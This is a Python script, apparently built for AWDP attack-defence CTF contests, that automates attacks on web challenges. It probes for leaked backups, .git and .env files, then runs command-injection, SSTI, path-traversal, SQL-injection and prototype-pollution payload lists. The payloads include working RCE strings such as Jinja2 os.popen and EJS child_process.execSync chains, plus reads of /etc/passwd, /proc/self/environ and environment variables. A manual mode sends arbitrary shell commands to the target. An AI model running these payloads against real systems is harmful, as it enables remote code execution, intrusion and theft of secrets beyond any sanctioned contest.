#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# sniper.py — AWDP 攻击侧抢分器（首杀工具）· 纯标准库，离线可用
# ------------------------------------------------------------
# 思路：线下赛大量分丢在"出题人没防住的老毛病"上。
#   对每道题一发：踩点(泄露/指纹/表单) → 参数电池(命令注入/SSTI/LFI/
#   SQLi/原型污染) → 命中自动续上拿 flag 的 payload → 汇总复现命令。
#   拿不到就明说"转人工"，别在这道题上磨。
#
# 用法:
#   python3 sniper.py http://1.2.3.4:8080/              # 全流程（默认）
#   python3 sniper.py recon http://.../                 # 只踩点
#   python3 sniper.py snipe http://.../                 # 只打电池
#   python3 sniper.py x 'http://t/ping.php?ip={P}' ';id' 'cat /flag'
#        # 手工桥：{P} 会被替换成每条命令（已编码），打通了但自动没拿到时用
#   python3 sniper.py submit 'flag{...}'                # 交本地平台
#   python3 sniper.py submit 'flag{...}' --platform http://127.0.0.1:9000
#
# 特征全走 marker/回显/时延，不做任何破坏性操作（无写文件/无删东西）。
# 走代理：环境变量 http_proxy=... 即可（urllib 默认认）。
# ============================================================
import base64
import http.cookiejar
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor

# ---------------- 基础 ----------------
OPENER = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
HDRS = {'User-Agent': 'Mozilla/5.0 (Macintosh) sniper/1.0'}
FLAGS_RE = re.compile(r'(?:flag|FLAG|ctf|CTF)\{[^}\s]{1,180}\}')
UID_RE = re.compile(r'uid=\d+')
MARK = 'sn1per'   # 命令注入探测标记：echo MARK 的输出迟早会漏到响应里
FOUND = set()      # 拿到的 flag
HITS = []          # 命中记录 {kind, detail, curl}
LAST = {}          # 最近一次响应的响应头（指纹用）


def C(c, s):
    return '\033[%sm%s\033[0m' % (c, s) if sys.stdout.isatty() else s


def hit(msg):
    print(C('32', '[+] ') + msg)


def warn(msg):
    print(C('33', '[!] ') + msg)


def info(msg):
    print(C('90', '[*] ') + msg)


def req(url, method='GET', params=None, data=None, json_body=None,
        headers=None, timeout=8, scan=True):
    """统一请求入口。params=GET 参数，data=表单 dict，json_body=JSON。
    返回 (status, body, elapsed)。任何响应都顺手扫一遍 flag。"""
    if params:
        url += ('&' if '?' in url else '?') + urllib.parse.urlencode(
            params, quote_via=urllib.parse.quote)
    hdrs = dict(HDRS)
    body = None
    if json_body is not None:
        body = json.dumps(json_body).encode()
        hdrs['Content-Type'] = 'application/json'
    elif data is not None:
        body = urllib.parse.urlencode(data, quote_via=urllib.parse.quote).encode()
        hdrs['Content-Type'] = 'application/x-www-form-urlencoded'
    if headers:
        hdrs.update(headers)
    t0 = time.time()
    try:
        r = urllib.request.Request(url, data=body, method=method, headers=hdrs)
        with OPENER.open(r, timeout=timeout) as resp:
            text = resp.read().decode('utf-8', 'replace')
            st = resp.status
            LAST['headers'] = {k.lower(): v for k, v in resp.headers.items()}
    except urllib.error.HTTPError as e:
        text = e.read().decode('utf-8', 'replace')
        st = e.code
        LAST['headers'] = {k.lower(): v for k, v in e.headers.items()}
    except Exception as e:
        return 0, 'ERR:%s' % e, time.time() - t0
    if scan:
        m = FLAGS_RE.search(text)
        if m:
            record_flag(m.group(0), url)
    return st, text, time.time() - t0


def curl_of(method, url, params, data, json_body):
    s = 'curl -s '
    full = url + ('?' + urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
                  if params else '')
    if json_body is not None:
        s += "-X %s '%s' -H 'Content-Type: application/json' -d '%s'" % (
            method, full, json.dumps(json_body))
    elif data is not None:
        s += "-X %s '%s' -d '%s'" % (
            method, full, urllib.parse.urlencode(data, quote_via=urllib.parse.quote))
    else:
        s += "'%s'" % full
    return s


def record(kind, detail, curl):
    HITS.append((kind, detail, curl))


def record_flag(flag, url):
    if flag not in FOUND:
        FOUND.add(flag)
        print()
        print(C('32', '╔══════════ FLAG ══════════╗'))
        print(C('32', '  %s' % flag))
        print(C('32', '╚═══════════════════════════╝'))
        info('出处: %s' % url)


# ---------------- 踩点 ----------------
RECON_PATHS = [
    # 备份/打包泄露（出题人最常忘删）
    'www.zip', 'web.zip', 'backup.zip', 'src.zip', 'source.zip', 'code.zip',
    'html.zip', 'dist.zip', 'release.zip', 'build.zip', 'app.zip', '1.zip',
    'index.php.bak', 'index.php~', 'index.php.old', 'index.php.swp',
    'index.html.bak', 'app.py.bak', 'main.py.bak',
    # 版本控制/系统文件
    '.git/HEAD', '.git/config', '.git/index', '.svn/entries', '.DS_Store',
    '.env',
    # 技术栈自曝（顺带拿源码结构）
    'composer.json', 'package.json', 'requirements.txt', 'go.mod', 'Pipfile',
    # flag 裸奔（真的有）
    'flag', 'flag.txt', 'flag.php', 'f1ag', 'f1ag.txt', 'FLAG', 'fl4g.txt',
    # 常见面板/调试
    'admin/', 'login/', 'phpinfo.php', 'info.php', 'test.php', '1.php',
    'actuator', 'actuator/env', 'swagger.json', 'api/docs', 'robots.txt',
]
STATIC_EXT = ('.css', '.js', '.png', '.jpg', '.ico', '.svg', '.woff', '.gif')
BASE = {'status': 404, 'len': 0}


def fingerprint(url):
    st, body, _ = req(url, scan=False)
    h = LAST.get('headers', {})
    raw = ' '.join('%s:%s' % kv for kv in h.items()).lower() + body[:4000].lower()
    stack = '?'
    rules = [('php', ('phpsessid', 'x-powered-by: php', '.php')),
             ('java', ('jsessionid', 'whitelabel', 'apache-coyote', 'tomcat')),
             ('node', ('connect.sid', 'x-powered-by: express')),
             ('python', ('werkzeug', 'python', 'wsgi', 'csrf_token'))]
    for name, keys in rules:
        for k in keys:
            if k in raw:
                stack = name
                break
        if stack != '?':
            break
    info('指纹: stack=%s (%s)' % (stack, h.get('server', '') or '未识别'))
    return stack, body


def parse_targets(url, html):
    """从首页 HTML 抽出 (method, path, params) 目标：表单 + 带参链接 + JS 里的路径"""
    tg = []
    for m in re.finditer(
            r'<form[^>]*action=["\']?([^"\'>\s]*)["\']?[^>]*method=["\']?(\w+)',
            html, re.I) or []:
        action, method = m.group(1) or url, (m.group(2) or 'GET').upper()
        full = urllib.parse.urljoin(url, action)
        names = re.findall(r'<(?:input|textarea|select)[^>]*name=["\']?([\w\-]+)', html[m.end():m.end() + 4000], re.I)
        if names:
            tg.append((method, full, names[:6]))
    for m in re.finditer(r'href=["\']([^"\']*\?[^"\']+)["\']', html):
        q = urllib.parse.urlparse(urllib.parse.urljoin(url, m.group(1)))
        ps = list(urllib.parse.parse_qs(q.query, keep_blank_values=True))
        if ps:
            tg.append(('GET', urllib.parse.urljoin(url, q.path), ps[:6]))
    for m in re.finditer(r'["\'`](/(?:api|admin|user|src|source)[\w/\-\.]{1,50})["\'`]', html):
        p = m.group(1)
        if not p.endswith(STATIC_EXT):
            tg.append(('GET', urllib.parse.urljoin(url, p), []))
    # 去重
    seen, out = set(), []
    for t in tg:
        key = (t[0], t[1], tuple(t[2]))
        if key not in seen:
            seen.add(key)
            out.append(t)
    return out


def recon(url):
    print(C('1', '── 踩点 %s ──' % url))
    # 软 404 基线：随机路径两条
    for p in ('sniper_' + 'x' * 8, 'sniper_' + 'y' * 8):
        st, b, _ = req('%s/%s' % (url.rstrip('/'), p), scan=False)
        if st:
            BASE.update(status=st, len=len(b))
    info('软404基线: status=%s len=%s' % (BASE['status'], BASE['len']))

    stack, html = fingerprint(url)

    def check(path):
        full = '%s/%s' % (url.rstrip('/'), path)
        st, b, el = req(full, scan=False, timeout=6)
        if st == 0:
            return None
        if st in (401, 403):
            return (path, st, b[:80])
        if st != 200 or BASE['status'] != 200 or abs(len(b) - BASE['len']) > 48:
            if st == 200 or st in (301, 302):
                return (path, st, b[:80])
        return None

    with ThreadPoolExecutor(10) as ex:
        for r in ex.map(check, RECON_PATHS):
            if r:
                path, st, snip = r
                hit('泄露/面板 [%s] /%s  %s' % (st, path, C('90', repr(snip[:60]))))
                record('recon', '/%s -> %s' % (path, st), "curl -s '%s/%s'" % (url.rstrip('/'), path))
                if path == 'robots.txt' and st == 200:
                    for ln in [l for l in snip.splitlines() if l.strip()][:8]:
                        info('robots: %s' % ln)

    targets = parse_targets(url, html)
    # 二级跟随：首页里指到的本站页面（表单常挂在二级页上）
    pages = [url]
    seen_path = {urllib.parse.urlparse(url).path}
    for m in re.finditer(r'href=["\']([^"\'?#]+)["\']', html):
        link = urllib.parse.urljoin(url, m.group(1))
        p = urllib.parse.urlparse(link)
        if p.netloc and p.path.endswith(('.php', '.html', '/')) and p.path not in seen_path \
                and not p.path.endswith(STATIC_EXT) and len(pages) < 7:
            seen_path.add(p.path)
            pages.append(link)
    for page in pages[1:]:
        st2, h2, _ = req(page, scan=False)
        if st2 == 200 and '<form' in h2.lower():
            for t in parse_targets(page, h2):
                if t not in targets:
                    targets.append(t)

    targets = [t for t in targets if t[0] == 'POST' or t[2] or t[1] == url or '/api/' in t[1]]
    for m, u, ps in targets:
        info('入口: %s %s  参数=%s' % (m, u, ps or '-'))
    if not any(ps for _, _, ps in targets):
        warn('没抓到表单/参数，用默认参数名集合盲打')
        for name in ('ip', 'cmd', 'file', 'page', 'view', 'path', 'url',
                     'name', 'id', 'q', 'query', 'tpl', 'template', 'host'):
            targets.append(('GET', url, [name]))
            targets.append(('POST', url, [name]))
    return stack, targets


# ---------------- 电池 ----------------
CMD_WRAPPERS = [(';', ';{}'), ('|', '|{}'), ('$()', '$({})'),
                ('`', '`{}`'), ('&&', '&&{}'), ('\\n', '\n{}')]
FLAG_READS = [
    'cat /flag', 'cat /flag.txt', 'cat /f*', 'nl /flag', 'head /flag',
    'grep . /flag', 'sort /flag', 'rev /flag', 'uniq /flag',
    'cat${IFS}/flag', 'grep${IFS}.${IFS}/flag', 'sort${IFS}/flag',
    'cat${IFS}/fla?', 'grep${IFS}.${IFS}/fla?', 'sort${IFS}/fla?',
    'ls /', 'ls${IFS}/', 'env', 'cat /proc/self/environ', 'id',
]
SSTI_PROBES = [
    ('jinja/twig', '{{7*7}}', '49'),
    ('jinja2', "{{7*'7'}}", '7777777'),
    ('freemarker/EL', '${7*7}', '49'),
    ('ruby/thymeleaf', '#{7*7}', '49'),
    ('thymeleaf', '*{7*7}', '49'),
    ('erb/ejs', '<%=(7*7)%>', '49'),
]
JINJA_GRABS = [
    "{{lipsum.__globals__['os'].popen('cat /flag').read()}}",
    "{{(lipsum.__globals__['o'+'s']|attr('pop'+'en'))('cat /fl'+'ag')|attr('read')()}}",
    "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
    "{{(cycler.__init__.__globals__['o'+'s']|attr('pop'+'en'))('ls /')|attr('read')()}}",
    "{{lipsum.__globals__['os'].environ}}",
    "{{get_flashed_messages.__globals__['current_app'].config}}",
]
EJS_GRABS = [
    '<%=process.mainModule.require("child_process").execSync("cat /flag")%>',
    '<%=require("fs").readFileSync("/flag")%>',
    '<%=system("cat /flag")%>',   # erb
]
FM_GRABS = [
    '<#assign e="freemarker.template.utility.Execute"?new()>${e("cat /flag")}',
]
LFI_PROBES = [
    '../../../../etc/passwd', '../../../../../etc/passwd',
    '....//....//....//etc/passwd', '/etc/passwd',
]
LFI_READS = ['flag', 'flag.txt', 'f*', 'proc/self/environ', 'app/app.py',
             'var/www/html/index.php']
SQL_ERR = re.compile(
    r'SQL syntax|sqlite3\.|Warning.{0,50}mysql|unrecognized token|'
    r'SQLException|psql.{0,30}ERROR|Query was empty', re.I)


def send_target(t, param, value, timeout=8):
    """往目标某个参数塞 payload（同表单其它参数填 1）"""
    m, u, ps = t
    others = {p: '1' for p in ps if p != param}
    if m == 'GET':
        q = dict(others)
        q[param] = value
        return req(u, params=q, timeout=timeout)
    if u.endswith(tuple(API_SUFFIX)) or '/api/' in u:
        j = dict(others)
        j[param] = value
        return req(u, method='POST', json_body=j, timeout=timeout)
    d = dict(others)
    d[param] = value
    return req(u, method='POST', data=d, timeout=timeout)


API_SUFFIX = ('/api', '/api/')


def battery_cmd(t, param):
    m, u, ps = t
    _, c0, _ = send_target(t, param, '123')
    for wname, w in CMD_WRAPPERS:
        # 两类探测：id（直接回显型）/ echo 标记（输出被拼进参数、靠报错回显型）。
        # 标记写成 sn1""per：被参数回显时是 sn1""per（搜 sn1per 搜不到），
        # 只有真被 shell 执行过才会输出 sn1per —— 防反射误报
        for inner in ('id', 'echo${IFS}sn1""per'):
            st, b, _ = send_target(t, param, w.format(inner))
            if (UID_RE.search(b) and 'uid=' not in c0) or \
                    (MARK in b and MARK not in c0):
                hit('命令注入 [%s] %s 参数 %s（分隔符 %s，%s）'
                    % (st, u, param, wname, inner[:12]))
                record('cmd-rce', '%s %s %s via %s' % (m, u, param, wname),
                       curl_of(*_curl_args(t, param, w.format(inner))))
                return grab_cmd(t, param, w)
    # 盲注（时延）
    for wname, w in ((';', ';sleep 5'), ('|', '|sleep 5'),
                     ('$()', '$(sleep 5)'), (';', ';sleep${IFS}5')):
        st, b, el = send_target(t, param, w, timeout=12)
        if el > 4.5:
            warn('疑似盲命令注入(时延 %.1fs) %s %s [%s] —— 用 x 子命令手工接' % (el, u, param, wname))
            record('cmd-blind', '%s %s %s' % (m, u, param), '# 时延验证过，转手工')
            return
    return


def _curl_args(t, param, value):
    m, u, ps = t
    others = {p: '1' for p in ps if p != param}
    q = dict(others)
    q[param] = value
    if m == 'GET':
        return 'GET', u, q, None, None
    j = dict(others)
    j[param] = value
    return 'POST', u, None, j, None


def grab_cmd(t, param, wrapper):
    """RCE 已确认 → 全套读 flag 的姿势跑一遍"""
    seen_ls = False
    for cmd in FLAG_READS:
        st, b, _ = send_target(t, param, wrapper.format(cmd))
        m = FLAGS_RE.search(b)
        if m:
            record_flag(m.group(0), '%s param=%s cmd=%r' % (t[1], param, cmd))
            return True
        if not seen_ls and re.search(r'(bin|etc|home|root|tmp)', b) and cmd.startswith(('ls',)):
            seen_ls = True
            info('目录列表: %s' % re.sub(r'<[^>]+>', ' ', b)[:300])
        time.sleep(0.05)
    warn('RCE 在手但自动姿势没读到 flag —— 手工: python3 sniper.py x ...')
    return False


def battery_ssti(t, param):
    m, u, ps = t
    _, c0, _ = send_target(t, param, 'sniper_probe')
    for eng, probe, mark in SSTI_PROBES:
        if mark in c0:
            continue
        st, b, _ = send_target(t, param, probe)
        if mark in b:
            hit('SSTI [%s] %s 参数 %s（%s）' % (st, u, param, eng))
            record('ssti', '%s %s %s (%s)' % (m, u, param, eng),
                   curl_of(*_curl_args(t, param, probe)))
            grabs = (JINJA_GRABS if 'jinja' in eng else
                     EJS_GRABS if eng == 'erb/ejs' else
                     FM_GRABS if 'freemarker' in eng else [])
            for g in grabs:
                st, b, _ = send_target(t, param, g)
                fm = FLAGS_RE.search(b)
                if fm:
                    record_flag(fm.group(0), '%s param=%s' % (u, param))
                    return True
                time.sleep(0.05)
            warn('SSTI 在手但自动 payload 被过滤 —— 手工变体')
            return False
    return False


def battery_lfi(t, param):
    m, u, ps = t
    for probe in LFI_PROBES:
        st, b, _ = send_target(t, param, probe)
        if re.search(r'root:[x*!]:0:0:', b):
            hit('LFI(目录穿越) [%s] %s 参数 %s  payload=%s' % (st, u, param, probe))
            record('lfi', '%s %s %s' % (m, u, param),
                   curl_of(*_curl_args(t, param, probe)))
            for f in LFI_READS:
                v = probe.replace('etc/passwd', f)
                st2, b2, _ = send_target(t, param, v)
                fm = FLAGS_RE.search(b2)
                if fm:
                    record_flag(fm.group(0), u)
                    return True
            return False
        if 'base64' in probe.lower():
            m2 = re.search(r'[A-Za-z0-9+/=]{60,}', b)
            if m2:
                try:
                    src = base64.b64decode(m2.group(0) + '==').decode('utf-8', 'replace')
                except Exception:
                    src = ''
                if src:
                    hit('php://filter 读源码 %s 参数 %s' % (u, param))
                    info('源码片段: %s' % src[:600].replace('\n', ' ')[:600])
                    record('lfi-filter', '%s %s' % (u, param),
                           curl_of(*_curl_args(t, param, probe)))
                    return False
    return False


def battery_sql(t, param):
    m, u, ps = t
    st, b, _ = send_target(t, param, "'")
    if SQL_ERR.search(b):
        hit('SQLi(报错) [%s] %s 参数 %s' % (st, u, param))
        record('sqli', '%s %s %s' % (m, u, param), curl_of(*_curl_args(t, param, "'")))
        warn('自动不脱库 —— 有 sqlmap 就上，没有转人工')
        return True
    a = send_target(t, param, '1 and 1=1')
    b2 = send_target(t, param, '1 and 1=2')

    def _strip(body, val):
        # 把参数值本身从响应里剥掉再比，防"参数回显"造成响应差异误报
        return body.replace(val, '').replace(
            urllib.parse.quote(val, safe=''), '')

    if a[0] == b2[0] == 200 and _strip(a[1], '1 and 1=1') != _strip(b2[1], '1 and 1=2'):
        warn('疑似布尔盲注 %s 参数 %s（剥除回显后响应仍有差异）' % (u, param))
        record('sqli-blind', '%s %s %s' % (m, u, param), '# 布尔差异验证过')
        return True
    return False


def battery_node(url, targets, stack):
    """JSON API：__proto__ / constructor.prototype 污染金丝雀"""
    apis = [u for _, u, _ in targets if '/api/' in u] or \
        ['%s/api/profile' % url.rstrip('/'), '%s/api/user' % url.rstrip('/')]
    for u in dict.fromkeys(apis):
        for key, payload in (
                ('__proto__', {'__proto__': {'awpwn1': 'PWNED'}}),
                ('constructor', {'constructor': {'prototype': {'awpwn2': 'PWNED'}}})):
            req(u, method='POST', json_body=payload, scan=False)
            st, b, _ = req(u, scan=False)
            if ('awpwn' in b):
                hit('原型污染确认 %s（%s 注入存活，GET 回显金丝雀）' % (u, key))
                record('proto', '%s %s' % (u, key),
                       "curl -s -X POST '%s' -H 'Content-Type: application/json' -d '%s' && curl -s '%s'"
                       % (u, json.dumps(payload), u))
                warn('后续链子看应用（merge→EJS/spawn/child_process），自动到此为止')
                return True
    return False


def battery_java(url, stack):
    if stack != 'java':
        return
    st, b, _ = req('%s/%%24%%7B7*7%%7D' % url.rstrip('/'), scan=False)
    if '49' in b:
        hit('Spring Boot 错误页 SpEL /${7*7} -> 49')
        record('spel', 'path ${7*7}', "curl -s '%s/${7*7}'  # 需 URL 编码" % url)
    warn('Java 题：认栈(spel/ognl/fastjson/shiro/log4j)后转人工')


def snipe(url, stack, targets):
    print(C('1', '── 电池 %s ──' % url))
    done = set()
    for t in targets:
        m, u, ps = t
        for p in (ps or [])[:6]:
            if (u, p) in done:
                continue
            done.add((u, p))
            for fn in (battery_cmd, battery_ssti, battery_lfi, battery_sql):
                r = fn(t, p)
                if r:
                    break
    battery_node(url, targets, stack)
    battery_java(url, stack)


# ---------------- 手工桥 / 提交 ----------------
def manual(url_tpl, cmds):
    for cmd in cmds:
        u = url_tpl.replace('{P}', urllib.parse.quote(cmd, safe=''))
        st, b, _ = req(u)
        pre = re.search(r'<pre[^>]*>(.*?)</pre>', b, re.S | re.I)
        text = re.sub(r'\s+', ' ', re.sub(
            r'<[^>]+>', ' ', pre.group(1) if pre else b)).strip()
        print('[%s] %s' % (st, cmd))
        print('    ' + text[:400])
        m = FLAGS_RE.search(b)
        if m:
            record_flag(m.group(0), u)


def submit(flag, platform):
    st, b, _ = req('%s/api/flag' % platform.rstrip('/'), method='POST',
                   json_body={'flag': flag}, scan=False)
    print('[%s] %s' % (st, b))


# ---------------- 汇总 ----------------
def summary(t0):
    print()
    print(C('1', '── 汇总（%.1fs）──' % (time.time() - t0)))
    if FOUND:
        for f in FOUND:
            print(C('32', '  FLAG: %s' % f))
    if HITS:
        print('命中 %d 处:' % len(HITS))
        for kind, detail, curl in HITS:
            print('  [%s] %s' % (kind, detail))
        print('复现命令:')
        for _, _, curl in HITS:
            print(C('90', '  %s' % curl))
    if not FOUND and not HITS:
        print(C('33', '  无快速通道 —— 这题防住了老毛病，转人工分析（看泄露的源码/加题思路）'))


def main():
    t0 = time.time()
    if len(sys.argv) < 2:
        print(__doc__)
        return
    cmd = sys.argv[1]
    if cmd == 'x':
        manual(sys.argv[2], sys.argv[3:])
    elif cmd == 'submit':
        plat = 'http://127.0.0.1:9000'
        if '--platform' in sys.argv:
            plat = sys.argv[sys.argv.index('--platform') + 1]
        submit(sys.argv[2], plat)
    elif cmd in ('recon', 'snipe'):
        url = sys.argv[2]
        if cmd == 'recon':
            recon(url)
            return
        stack, targets = recon(url)
        snipe(url, stack, targets)
        summary(t0)
    else:
        url = cmd
        stack, targets = recon(url)
        snipe(url, stack, targets)
        summary(t0)


if __name__ == '__main__':
    main()
